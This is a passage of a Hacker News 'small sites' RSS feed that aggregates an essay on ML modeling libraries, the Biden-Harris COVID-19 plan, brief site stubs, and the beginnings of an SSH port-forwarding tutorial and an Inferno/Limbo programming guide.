            <pubDate>Mon, 09 Nov 2020 04:12:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The choice of ML modeling library does not matter]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25031356">thread link</a>) | @chmaynard
<br/>
November 8, 2020 | https://www.shreya-shankar.com/modeling-libraries/ | <a href="https://web.archive.org/web/*/https://www.shreya-shankar.com/modeling-libraries/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When building the first machine learning pipelines for my company, I agonized over which modeling libraries to include in our stack. What would most model developers want to use? I felt strongly about scikit-learn and PyTorch, but what would be the consequences of imposing my opinions on ML frameworks on our company’s infrastructure? Which modeling library would “win” in the long-term? What if I wrote modeling code in a DSL that would become obsolete in a few years?</p>
<p>In 2016, I took an introductory deep learning class with assignments all in Tensorflow; my most recent deep learning course was completely conducted in PyTorch. Four years later, <a href="https://thegradient.pub/state-of-ml-frameworks-2019-pytorch-dominates-research-tensorflow-dominates-industry/">it seems like all ML researchers I know use PyTorch</a>. The few who don’t use PyTorch use TF 1.0, with the “some day I’ll switch to TF 2.0 or PyTorch” mantra. What happened?</p>
<p>Over several months, I realized that <strong>the choice of library does not matter, as modeling is just a tiny step in the machine learning pipeline.</strong> Other steps are equally, if not more, challenging to maintain: for example, <a href="https://www.oracle.com/technetwork/middleware/oedq/successful-data-migration-wp-1555708.pdf">it is much harder to migrate data pipeline code</a> than rewrite basic TF modeling code in PyTorch. I’ve written models in TensorFlow, PyTorch, XGBoost, scikit-learn, and LightGBM for different tasks for my company. I’ve even written non-Python models in Scala. When I iterate on machine learning pipelines for a prediction task, I avoid changing the model architectures as much as possible since <a href="https://www.shreya-shankar.com/making-ml-work/">I’d rather change parts of the pipeline I understand better</a>, like data ingestion and better featurization. My company’s pull requests show that people hardly touch their modeling code compared to pipeline code. What matters is having the infrastructure to “plug and play” ML model trainers and predictors, since there is almost never one programming library that meets all needs. </p>
<p>Some would point to the trends of researchers overwhelmingly preferring PyTorch and JAX and argue that a winner here actually does matter, because researchers turn into data scientists at companies, these data scientists build models, and the models will get productionized and used “forever.” But as a field, we’re still struggling with productionizing models, aligning their outputs with human incentives, iterating on these systems, and trusting these pipelines. For any ML practitioners outside “big tech,” their biggest problems are model pipelines and value alignment between customers, themselves, and machines. After all, these are essential to product development. Even if we built frameworks for these central problems, the modeling library still won’t matter because <a href="https://softwareengineering.stackexchange.com/a/390687">multiple software frameworks for a problem can happily coexist</a>. People are smart and can easily learn a different framework — the fact that there was such a large, rapid <a href="https://www.quora.com/Why-are-people-shifting-from-TensorFlow-to-PyTorch">transition from TensorFlow to PyTorch</a> within a few years proves that developers will find the best tool for their job. It matters more that they have the correct foundation for software they build.</p>
<p>Additionally, business considerations can override the choice of framework or even build new frameworks, particularly in startups. My company’s codebase for a particular ML problem has experienced something in this vein: first, I wrote experimental code in my DSLs of choice to “solve” the problem. Then when we had to build a product, I <a href="https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/">rewrote</a> the pipeline. Then when we pivoted slightly, I <a href="https://refactoring.com/">refactored</a> the pipeline to produce the live ML product we’re regularly releasing today. As I gained more clarity on the current version of the product and how other stakeholders (technical or nontechnical) might interact with it, I realized these business considerations drove pipeline development more than the modeling libraries or my opinions on other DSLs.</p>
<p>So the horse race of modeling libraries is misleading, and the most challenging problems in “real-world” ML right now revolve around business values, productionization, miniaturization, and pipelining for repeated training and inference. But since <a href="https://www.cs.princeton.edu/courses/archive/fall09/cos109/06langs.pdf">programming languages</a> and infrastructure <a href="https://www.forbes.com/sites/oracle/2015/05/20/javas-20-years-of-innovation">drive innovation in software</a>, it’s still worth thinking about the evolution of modeling libraries. In <a href="https://www.amazon.com/Mythical-Man-Month-Software-Engineering-Anniversary/dp/0201835959">The Mythical Man-Month: Essays on Software Engineering</a>, Fred Brooks introduces the concept of the <em><a href="https://en.wikipedia.org/wiki/Second-system_effect">second-system effect</a></em> to be “the tendency of small, elegant, and successful systems to be succeeded by over-engineered, bloated systems, due to inflated expectations and overconfidence.” Famous examples include the IBM System/360 operating system (which succeeded the IBM 700/7000 series from the 1950s), and the Multics operating system (which succeeded Compatible Time-Sharing System from the late 1960s). </p>
<p>I consider TF 1.0 a success: it accelerated a lot of deep learning research, was fairly narrow and thoughtful in scope, and spearheaded innovation in the hardware vertical with XLA compilation, TPUs, and more. But over time, as hundreds of TensorFlow engineers tried to address the software’s limitations and turn TensorFlow into a machine learning library for everybody, it suffered from the second-system effect and became TF 2.0, a machine learning library for nobody (possibly except for Google). One set of problems they tried to address is “making models work in production settings:” TFX is a great example of an <a href="https://blog.tensorflow.org/2020/09/brief-history-of-tensorflow-extended-tfx.html">overhyped</a> and <a href="https://pypistats.org/packages/tfx">underused</a> TF 2.0 tool. Compare the PyPI stats with <a href="https://pypistats.org/packages/kfp">Kubeflow</a>’s for context; TFX built their framework to fit nicely with Kubeflow and Kubeflow users still don’t want to use TFX. This is not to say the problems with production ML aren’t real; rather, it seems TFX currently isn’t <em>the</em> solution to many of these incredibly challenging problems. Having tutorials doesn’t help if the <a href="https://neptune.ai/blog/deep-dive-into-ml-models-in-production-using-tfx-and-kubeflow">UX is counterintuitive and engineers need to become professional error log parsers</a> to become proficient with the tool.</p>
<p>All this being said about my criticism for the TensorFlow UX, I actually use TF 2.0 at work — mainly out of laziness. The Spark to TFRecord to TFData to TF model pipeline is <a href="https://github.com/tensorflow/ecosystem/tree/master/spark/spark-tensorflow-connector">partially</a> <a href="https://docs.databricks.com/applications/machine-learning/load-data/tfrecords-save-load.html">documented</a>, whereas the Spark to TFRecord to something to PyTorch model pipeline is only <a href="https://github.com/uber/petastorm">barely</a> <a href="https://databricks.com/blog/2020/06/16/simplify-data-conversion-from-apache-spark-to-tensorflow-and-pytorch.html">documented</a>. But the DSL for my models is hardly something I think about on a day-to-day basis, since most of my problems aren’t “how quickly can I code up a transformer or convnet architecture from scratch.” People in this industry rarely build things from scratch. Software products are built on the <a href="https://effectivesoftwaredesign.com/2014/11/02/the-minimum-viable-product-and-incremental-software-development/">principle of incrementality</a>; code and features accumulate over time. </p>
<p>So my answer to my original question is that it’s not worth worrying about which modeling library will “win” in the long run, because <strong>multiple libraries can win if they each do something important</strong>, such as championing the dataflow paradigm or easy autodifferentiation. If you’re an engineer, don’t build your pipelines around a specific modeling library. If you’re a researcher or data scientist, don’t worry about learning all the modeling libraries or whatever libraries the company’s job description mentions. Software history indicates that the modeling framework bloat is inevitable, and for as long as these libraries’ biggest priorities are to compete with each other, they will all converge to the same solutions to mission-critical modeling problems — <a href="https://ai.googleblog.com/2017/10/eager-execution-imperative-define-by.html">eager execution</a>, ease of <a href="https://www.tensorflow.org/tutorials/quickstart/beginner">building a model from scratch</a>, ability to <a href="https://pytorch-lightning.readthedocs.io/en/latest/loggers.html">nicely view loss curves</a>, and more. But these are only a fraction of most “real-world” machine learning problems, and you, as a machine learning practitioner, at the end of the day aren’t hired only for your expertise in training a model once; you’re hired to make a machine learning system consistently deliver value to an end user.</p>
<p><em>Thanks to <a href="https://people.eecs.berkeley.edu/~pathakr/">Reese Pathak</a>, <a href="https://www.linkedin.com/in/jayant-bhambhani-31b71821/">Jay Bhambhani</a> and <a href="https://twitter.com/debnilsur">Debnil Sur</a> for their feedback on multiple drafts.</em></p></div></div>]]>
            </description>
            <link>https://www.shreya-shankar.com/modeling-libraries/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031356</guid>
            <pubDate>Mon, 09 Nov 2020 04:04:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Covid-19 The Biden-Harris plan to beat Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25031354">thread link</a>) | @hkhn
<br/>
November 8, 2020 | https://buildbackbetter.com/priorities/covid-19/ | <a href="https://web.archive.org/web/*/https://buildbackbetter.com/priorities/covid-19/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	

		<section id="content">

	  
<div data-module="">
  <div>
	<div>
	  <p><span>The American people deserve an urgent, robust, and professional response to the growing public health and economic crisis caused by the coronavirus (COVID-19) outbreak. President-elect Biden believes that the federal government must act swiftly and aggressively to help protect and support our families, small businesses, first responders, and caregivers essential to help us face this challenge, those who are most vulnerable to health and economic impacts, and our broader communities – not to blame others or bail out corporations. </span></p>
	</div>
  </div>
</div>

<div data-module="" id="covid-19-2" data-new-section="false" data-id="covid-19-2">
  <div>
	<div>
	  <div>
	   <p>The Biden-Harris administration will always:</p>
<ul>
<li><strong>Listen to science</strong></li>
<li><strong>Ensure public health decisions are informed by public health professionals</strong></li>
<li><strong>Promote trust, transparency, common purpose, and accountability in our government</strong></li>
</ul>
<p>President-elect Biden and Vice President-elect Harris have a seven-point plan to beat COVID-19.</p>
<p><strong>Ensure all Americans have access to regular, reliable, and free testing.</strong></p>
<ul>
<li>Double the number of drive-through testing sites.</li>
<li>Invest in next-generation testing, including at home tests and instant tests, so we can scale up our testing capacity by orders of magnitude.</li>
<li>Stand up a Pandemic Testing Board like Roosevelt’s War Production Board. It’s how we produced tanks, planes, uniforms, and supplies in record time, and it’s how we will produce and distribute tens of millions of tests.</li>
<li>Establish a U.S. Public Health Jobs Corps to mobilize at least 100,000 Americans across the country with support from trusted local organizations in communities most at risk to perform culturally competent approaches to contact tracing and protecting at-risk populations.</li>
</ul>
<p><strong>Fix personal protective equipment (PPE) problems for good.</strong></p>
<p>President-elect Joe Biden is taking responsibility and giving states, cities, tribes, and territories the critical supplies they need.</p>
<ul>
<li>Fully use the Defense Production Act to ramp up production of masks, face shields, and other PPE so that the national supply of personal protective equipment exceeds demand and our stores and stockpiles — especially in hard-hit areas that serve disproportionately vulnerable populations — are fully replenished.</li>
<li>Build immediately toward a future, flexible American-sourced and manufactured capability to ensure we are not dependent on other countries in a crisis.</li>
</ul>
<p><strong>Provide clear, consistent, evidence-based guidance for how communities should navigate the pandemic – and the resources for schools, small businesses, and families to make it through.</strong></p>
<ul>
<li>Social distancing is not a light switch. It is a dial. President-elect Biden will direct the CDC to provide specific evidence-based guidance for how to turn the dial up or down relative to the level of risk and degree of viral spread in a community, including when to open or close certain businesses, bars, restaurants, and other spaces; when to open or close schools, and what steps they need to take to make classrooms and facilities safe; appropriate restrictions on size of gatherings; when to issue stay-at-home restrictions.</li>
<li>Establish a renewable fund for state and local governments to help prevent budget shortfalls, which may cause states to face steep cuts to teachers and first responders.</li>
<li>Call on Congress to pass an emergency package to ensure schools have the additional resources they need to adapt effectively to COVID-19.</li>
<li>Provide a “restart package” that helps small businesses cover the costs of operating safely, including things like plexiglass and PPE.</li>
</ul>
	  </div>
	</div>
  </div>
</div>

<!-- .module.block-quote -->

<div data-module="" id="covid-19-4" data-new-section="false" data-id="covid-19-4">
  <div>
	<div>
	  <div>
	   <p><strong>Plan for the effective, equitable distribution of treatments and vaccines — because development isn’t enough if they aren’t effectively distributed.</strong></p>
<ul>
<li>Invest $25 billion in a vaccine manufacturing and distribution plan that will guarantee it gets to every American, cost-free.</li>
<li>Ensure that politics plays no role in determining the safety and efficacy of any vaccine. The following 3 principles will guide the Biden-Harris administration: Put scientists in charge of all decisions on safety and efficacy; publicly release clinical data for any vaccine the FDA approves; and authorize career staff to write a written report for public review and permit them to appear before Congress and speak publicly uncensored.</li>
<li>Ensure everyone — not just the wealthy and well-connected — in America receives the protection and care they deserve, and consumers are not price gouged as new drugs and therapies come to market.</li>
</ul>
<p><strong>Protect older Americans and others at high risk.</strong></p>
<p>President-elect Biden understands that older Americans and others at high-risk are most vulnerable to COVID-19.</p>
<ul>
<li>Establish a COVID-19 Racial and Ethnic Disparities Task Force, as proposed by Vice President-elect Harris, to provide recommendations and oversight on disparities in the public health and economic response. At the end of this health crisis, it will transition to a permanent Infectious Disease Racial Disparities Task Force.</li>
<li>Create the Nationwide Pandemic Dashboard that Americans can check in real-time to help them gauge whether local transmission is actively occurring in their zip codes. This information is critical to helping all individuals, but especially older Americans and others at high risk, understand what level of precaution to take.</li>
</ul>
<p><strong>Rebuild and expand defenses to predict, prevent, and mitigate pandemic threats, including those coming from China.</strong></p>
<ul>
<li>Immediately restore the White House National Security Council Directorate for Global Health Security and Biodefense, originally established by the Obama-Biden administration.</li>
<li>Immediately restore our relationship with the World Health Organization, which — while not perfect — is essential to coordinating a global response during a pandemic.</li>
<li>Re-launch and strengthen U.S. Agency for International Development’s pathogen-tracking program called PREDICT.</li>
<li>Expand the number of CDC’s deployed disease detectives so we have eyes and ears on the ground, including rebuilding the office in Beijing.</li>
</ul>
<p><strong>Implement mask mandates nationwide by working with governors and mayors and by asking the American people to do what they do best: step up in a time of crisis.</strong></p>
<p>Experts agree that tens of thousands of lives can be saved if Americans wear masks. President-elect Biden will continue to call on:</p>
<ul>
<li>Every American to wear a mask when they are around people outside their household.</li>
<li>Every Governor to make that mandatory in their state.</li>
<li>Local authorities to also make it mandatory to buttress their state orders.</li>
</ul>
<p>Once we succeed in getting beyond this pandemic, we must ensure that the millions of Americans who suffer long-term side effects from COVID don’t face higher premiums or denial of health insurance because of this new pre-existing condition. The Biden-Harris Administration will work to ensure that the protections for those with pre-existing conditions that were won with Obamacare are protected. And, they will work to lower health care costs and expand access to quality, affordable health care through a Medicare-like public option.</p>
	  </div>
	</div>
  </div>
</div>



	</section>

  </article></div>]]>
            </description>
            <link>https://buildbackbetter.com/priorities/covid-19/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031354</guid>
            <pubDate>Mon, 09 Nov 2020 04:04:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A fun website that simulates fluid]]>
            </title>
            <description>
<![CDATA[
Score 112 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25031304">thread link</a>) | @svikashk
<br/>
November 8, 2020 | https://paveldogreat.github.io/WebGL-Fluid-Simulation/ | <a href="https://web.archive.org/web/*/https://paveldogreat.github.io/WebGL-Fluid-Simulation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        <p>Try Fluid Simulation app!</p>
                        <p><a id="apple_link" target="_blank">
                                <img alt="Download on the App Store" src="https://paveldogreat.github.io/WebGL-Fluid-Simulation/app_badge.png">
                            </a>
                            <a id="google_link" target="_blank">
                                <img alt="Get it on Google Play" src="https://paveldogreat.github.io/WebGL-Fluid-Simulation/gp_badge.png">
                            </a>
                        </p>
                    </div></div>]]>
            </description>
            <link>https://paveldogreat.github.io/WebGL-Fluid-Simulation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031304</guid>
            <pubDate>Mon, 09 Nov 2020 03:54:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Where were you when the US election was called? A map of the stars]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25031179">thread link</a>) | @juanre
<br/>
November 8, 2020 | https://greaterskies.com/free-map/harris-2020 | <a href="https://web.archive.org/web/*/https://greaterskies.com/free-map/harris-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-7218771b=""><div><h2>About your star map</h2> <p>It is an accurate image of the sky as seen from a particular place and time, including thousands of stars, the Moon, the Sun and the planets.</p> <p>We have been making these maps since 2006, and are proud to make the very best available.  You can learn more about them
      <a href="https://greaterskies.com/star-map" target="_blank">here</a>.</p> <p>We really hope you will love it!</p> <p>The GreaterSkies team</p></div></div></div>]]>
            </description>
            <link>https://greaterskies.com/free-map/harris-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031179</guid>
            <pubDate>Mon, 09 Nov 2020 03:25:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SSH Tunneling Basics]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25031064">thread link</a>) | @bswamina
<br/>
November 8, 2020 | https://www.polarsparc.com/xhtml/SSH-Tunnel.html | <a href="https://web.archive.org/web/*/https://www.polarsparc.com/xhtml/SSH-Tunnel.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <br>
    
    <br>
    
    
    <hr> 
    <p>Overview</p>
    <p>In networking, a <span>Tunnel</span> is used to encapsulate a communication protocol that is not supported
        by the network inside a protocol that is supported by the network.</p>
    <p>The following are some of terms used in this article:</p>
    <table id="col2-table">
      <thead>
        <tr>
          <th>Term</th>
          <th>Description</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><span>SSH</span></td>
          <td>short for <span>S</span>ecure <span>SH</span>ell is a protocol that sets
            up an encrypted connection between two nodes over an unsecured network using a Client-Server architecture</td>
        </tr>
        <tr>
          <td><span>SSH Server</span></td>
          <td>a server that listens on the TCP port <span>22</span> for incoming SSH client
            requests, then authenticates those client requests, and provides a command prompt</td>
        </tr>
        <tr>
          <td><span>SSH Client</span></td>
          <td>a client used to connect to the remote SSH Server on a specific network node</td>
        </tr>
        <tr>
          <td><span>SSH Tunnel</span></td>
          <td>a method of encapsulating and transmitting arbitrary networking data over an encrypted SSH
            connection between a client node and a server node</td>
        </tr>
        <tr>
          <td><span>SSH Port Forwarding</span></td>
          <td>another name for <span>SSH Tunnel</span></td>
        </tr>
      </tbody>
    </table>
    <div id="para-div">
      <p>So, why do we need <span>tunneling</span> ??? The following are some of the reasons:</p>
      <ul id="blue-sqr-ul">
        <li>
          <p>To allow access to legacy applications or unsecure services such as IMAP, POP3, VNC, etc</p>
        </li>
        <li>
          <p>To implement a virtual private network (<span>VPN</span>)</p>
        </li>
        <li>
          <p>To allow access to services behind a firewall</p>
        </li>
      </ul>
    </div>
    <div id="para-div">
      <p>There are <span>3</span> types of <span>SSH Tunnel</span> options as listed below:</p>
      <ol id="blue-ol">
        <li>
          <p><span>Local</span> Port Forwarding</p>
        </li>
        <li>
          <p><span>Remote</span> Port Forwarding</p>
        </li>
        <li>
          <p><span>Dynamic</span> Port Forwarding</p>
        </li>
      </ol>
    </div>
    <p>We will discuss and demonstrate each of the above options in the following sections.</p>
    <p>Setup</p>
    <p>The setup will be on a Ubuntu 20.04 LTS based Linux desktop. For the demonstrations, we will create an environment with
        3 virtual machines running on the hypervisor <span>VirtualBox</span>.</p>
    <p>The following diagram illustrates the environment setup:</p>
    <div id="img-outer-div"> <p><img src="https://www.polarsparc.com/xhtml/images/ssh-tunnel-2.png" alt="Environment"></p><p>Environment</p>
    </div>
    <br>
    <div id="para-div">
      <p>The following are some of the highlights of the 3 virtual machines:</p>
      <ul id="blue-sqr-ul">
        <li>
          <p><span>vm-1</span> :: 1 vCPU, 2GB RAM, 20GB storage, Ubuntu 20.04 OS, and uses a single virtual network
            interface with <span>NAT</span> networking (<span>10.0.2.15</span>)</p>
        </li>
        <li>
          <p><span>vm-2</span> :: 1 vCPU, 2GB RAM, 20GB storage, Ubuntu 20.04 OS, and uses a single virtual network
            interface with <span>Host-only</span> networking (<span>192.168.56.104</span>)</p>
        </li>
        <li>
          <p><span>vm-3</span> :: 1 vCPU, 2GB RAM, 20GB storage, Ubuntu 20.04 OS, and uses a two separate virtual
            network interfaces - one with <span>NAT</span> networking (<span>10.0.2.4</span>) and the
            other with <span>Host-only</span> networking (<span>192.168.56.103</span>)</p>
        </li>
      </ul>
    </div>
    <p>Open a Terminal window in each of the 3 virtual machines <span>vm-1</span> thru <span>vm-3</span>
        and install <span>Python Flask</span>, <span>Net Tools</span>, and <span>SSH Server
        </span> by executing the following command:</p>
    <p>$ sudo apt install python3-flask net-tools openssh-server -y</p>
    <p>The following would be a typical output:</p>
    <div id="out-div">
      <h4>Output.1</h4>
      <pre>Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following additional packages will be installed:
  javascript-common libjs-jquery ncurses-term openssh-sftp-server python3-itsdangerous python3-jinja2 python3-markupsafe
  python3-openssl python3-pyinotify python3-werkzeug ssh-import-id
Suggested packages:
  apache2 | lighttpd | httpd molly-guard monkeysphere ssh-askpass python-flask-doc python-jinja2-doc python-openssl-doc
  python3-openssl-dbg python-pyinotify-doc ipython3 python-werkzeug-doc python3-lxml python3-termcolor python3-watchdog
The following NEW packages will be installed:
  javascript-common libjs-jquery ncurses-term net-tools openssh-server openssh-sftp-server python3-flask python3-itsdangerous
  python3-jinja2 python3-markupsafe python3-openssl python3-pyinotify python3-werkzeug ssh-import-id
0 upgraded, 14 newly installed, 0 to remove and 0 not upgraded.
Need to get 1,478 kB of archives.
After this operation, 9,096 kB of additional disk space will be used.
Get:1 http://us.archive.ubuntu.com/ubuntu focal/main amd64 javascript-common all 11 [6,066 B]
Get:2 http://us.archive.ubuntu.com/ubuntu focal/main amd64 libjs-jquery all 3.3.1~dfsg-3 [329 kB]
Get:3 http://us.archive.ubuntu.com/ubuntu focal/main amd64 ncurses-term all 6.2-0ubuntu2 [249 kB]
Get:4 http://us.archive.ubuntu.com/ubuntu focal/main amd64 net-tools amd64 1.60+git20180626.aebd88e-1ubuntu1 [196 kB]
Get:5 http://us.archive.ubuntu.com/ubuntu focal-updates/main amd64 openssh-sftp-server amd64 1:8.2p1-4ubuntu0.1 [51.5 kB]
Get:6 http://us.archive.ubuntu.com/ubuntu focal-updates/main amd64 openssh-server amd64 1:8.2p1-4ubuntu0.1 [377 kB]
Get:7 http://us.archive.ubuntu.com/ubuntu focal/main amd64 python3-itsdangerous all 1.1.0-1 [14.6 kB]
Get:9 http://us.archive.ubuntu.com/ubuntu focal/main amd64 python3-markupsafe amd64 1.1.0-1build2 [13.9 kB]
Get:9 http://us.archive.ubuntu.com/ubuntu focal/main amd64 python3-jinja2 all 2.10.1-2 [95.5 kB]
Get:10 http://us.archive.ubuntu.com/ubuntu focal/main amd64 python3-werkzeug all 0.16.1+dfsg1-2 [183 kB]
Get:11 http://us.archive.ubuntu.com/ubuntu focal/main amd64 python3-flask all 1.1.1-2 [80.3 kB]
Get:12 http://us.archive.ubuntu.com/ubuntu focal/main amd64 python3-openssl all 19.0.0-1build1 [43.3 kB]
Get:13 http://us.archive.ubuntu.com/ubuntu focal/main amd64 python3-pyinotify all 0.9.6-1.2ubuntu1 [24.8 kB]
Get:14 http://us.archive.ubuntu.com/ubuntu focal/main amd64 ssh-import-id all 5.10-0ubuntu1 [10.0 kB]
Fetched 1,478 kB in 0s (5,095 kB/s)  
Preconfiguring packages ...
Selecting previously unselected package javascript-common.
(Reading database ... 192970 files and directories currently installed.)
Preparing to unpack .../00-javascript-common_11_all.deb ...
Unpacking javascript-common (11) ...
Selecting previously unselected package libjs-jquery.
Preparing to unpack .../01-libjs-jquery_3.3.1~dfsg-3_all.deb ...
Unpacking libjs-jquery (3.3.1~dfsg-3) ...
Selecting previously unselected package ncurses-term.
Preparing to unpack .../02-ncurses-term_6.2-0ubuntu2_all.deb ...
Unpacking ncurses-term (6.2-0ubuntu2) ...
Preparing to unpack .../net-tools_1.60+git20180626.aebd88e-1ubuntu1_amd64.deb ...
Unpacking net-tools (1.60+git20180626.aebd88e-1ubuntu1) ...
Selecting previously unselected package openssh-sftp-server.
Preparing to unpack .../03-openssh-sftp-server_1%3a8.2p1-4ubuntu0.1_amd64.deb ...
Unpacking openssh-sftp-server (1:8.2p1-4ubuntu0.1) ...
Selecting previously unselected package openssh-server.
Preparing to unpack .../04-openssh-server_1%3a8.2p1-4ubuntu0.1_amd64.deb ...
Unpacking openssh-server (1:8.2p1-4ubuntu0.1) ...
Selecting previously unselected package python3-itsdangerous.
Preparing to unpack .../05-python3-itsdangerous_1.1.0-1_all.deb ...
Unpacking python3-itsdangerous (1.1.0-1) ...
Selecting previously unselected package python3-markupsafe.
Preparing to unpack .../06-python3-markupsafe_1.1.0-1build2_amd64.deb ...
Unpacking python3-markupsafe (1.1.0-1build2) ...
Selecting previously unselected package python3-jinja2.
Preparing to unpack .../07-python3-jinja2_2.10.1-2_all.deb ...
Unpacking python3-jinja2 (2.10.1-2) ...
Selecting previously unselected package python3-werkzeug.
Preparing to unpack .../08-python3-werkzeug_0.16.1+dfsg1-2_all.deb ...
Unpacking python3-werkzeug (0.16.1+dfsg1-2) ...
Selecting previously unselected package python3-flask.
Preparing to unpack .../09-python3-flask_1.1.1-2_all.deb ...
Unpacking python3-flask (1.1.1-2) ...
Selecting previously unselected package python3-openssl.
Preparing to unpack .../10-python3-openssl_19.0.0-1build1_all.deb ...
Unpacking python3-openssl (19.0.0-1build1) ...
Selecting previously unselected package python3-pyinotify.
Preparing to unpack .../11-python3-pyinotify_0.9.6-1.2ubuntu1_all.deb ...
Unpacking python3-pyinotify (0.9.6-1.2ubuntu1) ...
Selecting previously unselected package ssh-import-id.
Preparing to unpack .../12-ssh-import-id_5.10-0ubuntu1_all.deb ...
Unpacking ssh-import-id (5.10-0ubuntu1) ...
Setting up javascript-common (11) ...
Setting up net-tools (1.60+git20180626.aebd88e-1ubuntu1) ...
Setting up openssh-sftp-server (1:8.2p1-4ubuntu0.1) ...
Setting up openssh-server (1:8.2p1-4ubuntu0.1) ...
Creating config file /etc/ssh/sshd_config with new version
Creating SSH2 RSA key; this may take some time ...
3072 SHA256:OVmIaDeM2PCBtB6O5tddPIC3q4nuZVdqfcs/7A3QM5A root@vm-3 (RSA)
Creating SSH2 ECDSA key; this may take some time ...
256 SHA256:qDrGgauXE9LwZ6S1j4fjbY0LIPyrL+YSU8iq+PbR7jM root@vm-3 (ECDSA)
Creating SSH2 ED25519 key; this may take some time ...
256 SHA256:WBk+gqOXD47VoAJrw+JeZLxQlzBWdaKFRxi5xfPAkYg root@vm-3 (ED25519)
Created symlink /etc/systemd/system/sshd.service â†’ /lib/systemd/system/ssh.service.
Created symlink /etc/systemd/system/multi-user.target.wants/ssh.service â†’ /lib/systemd/system/ssh.service.
rescue-ssh.target is a disabled or a static unit, not starting it.
Setting up python3-openssl (19.0.0-1build1) ...
Setting up ssh-import-id (5.10-0ubuntu1) ...
Attempting to convert /etc/ssh/ssh_import_id
Setting up python3-pyinotify (0.9.6-1.2ubuntu1) ...
Setting up python3-itsdangerous (1.1.0-1) ...
Setting up python3-markupsafe (1.1.0-1build2) ...
Setting up python3-jinja2 (2.10.1-2) ...
Setting up libjs-jquery (3.3.1~dfsg-3) ...
Setting up ncurses-term (6.2-0ubuntu2) ...
Setting up python3-werkzeug (0.16.1+dfsg1-2) ...
Setting up python3-flask (1.1.1-2) ...
Processing triggers for systemd (245.4-4ubuntu3.3) ...
Processing triggers for man-db (2.9.1-1) ...
Processing triggers for ufw (0.36-6) ...</pre>
    </div>
    <p>Local Port Forwarding</p>
    <p>Assuming <span>vm-3</span> is hosting a useful web application on <span>10.0.2.4</span>, it is
        *ONLY* accessible within the <span>10.0.2.x</span> network. What if a client on the <span>
        vm-2</span> wants to access the web application ???</p>
    <p>In this situation, one could use Local Port Forwarding SSH Tunnel option to allow the client <span>vm-2</span>
        running on <span>192.168.56.104</span> to access the web application server running on the
        <span>10.0.2.x</span> network.</p>
    <p>The following is the code for the simple <span>Python</span> based web application:</p>
    <fieldset id="sc-fieldset"> <legend>Web.py</legend>
      <pre>import sys
from datetime import datetime
from flask …</pre></fieldset></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.polarsparc.com/xhtml/SSH-Tunnel.html">https://www.polarsparc.com/xhtml/SSH-Tunnel.html</a></em></p>]]>
            </description>
            <link>https://www.polarsparc.com/xhtml/SSH-Tunnel.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031064</guid>
            <pubDate>Mon, 09 Nov 2020 03:02:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Program Development in Limbo for Inferno OS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25030961">thread link</a>) | @marttt
<br/>
November 8, 2020 | https://seh.dev/limbo-intro/ | <a href="https://web.archive.org/web/*/https://seh.dev/limbo-intro/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
    <div>
<h2 id="motivation">Motivation</h2>
<p>Resources covering software development under Inferno are fairly scarce.</p>
<p>As such, this post aims to provide a start-to-finish demonstration of program development in Limbo inside Inferno.</p>
<h2 id="introduction">Introduction</h2>
<p>This post assumes you’re using Inferno, specifically <a href="https://code.9front.org/hg/purgatorio/">purgatorio</a>, hosted under <code>linux/amd64</code> or similar.</p>
<p>It’s also possible to use Inferno under Docker as per the <code>INSTALL</code> file.</p>
<p>Other platforms are supported, but steps may differ here or there.</p>
<p>The rune <code>$</code> indicates a unix shell command under <code>bash</code>, probably.</p>
<p>The rune <code>;</code> or <code>%</code> indicates a command to be run from inside Inferno.</p>
<p>The final source from this post: <a href="https://github.com/henesy/socketh-limbo">https://github.com/henesy/socketh-limbo</a></p>
<p>This post will be an implementation of <a href="https://github.com/henesy/SocketH">SocketH</a> which was originally written in Go and has a few other implementations:</p>
<ul>
<li><a href="https://github.com/henesy/socketh-myr">https://github.com/henesy/socketh-myr</a></li>
<li><a href="https://github.com/henesy/SocketS">https://github.com/henesy/SocketS</a></li>
</ul>
<p>The original code isn’t great, but it gives a target for what we want to create.</p>
<h2 id="getting-started">Getting started</h2>
<p>Many, if not all, of these development steps prior to <em>running</em> the final Dis bytecode can be done from outside of Inferno.</p>
<p>The limbo compiler can be called as <code>limbo</code> and with the right workflow development may be more pleasant.</p>
<p>This post assumes:</p>
<ul>
<li>Development occurs inside of Inferno for the purpose of consistency</li>
<li>Some knowledge about imperative, C-like, language programming</li>
<li>Some knowledge about how unix-like systems work</li>
<li>Some knowledge about how C-like compiler and linker flows work</li>
<li>Knowledge about how to interact with a unix-like shell</li>
<li>Vague knowledge about Inferno, such as the fact Inferno exists ☺</li>
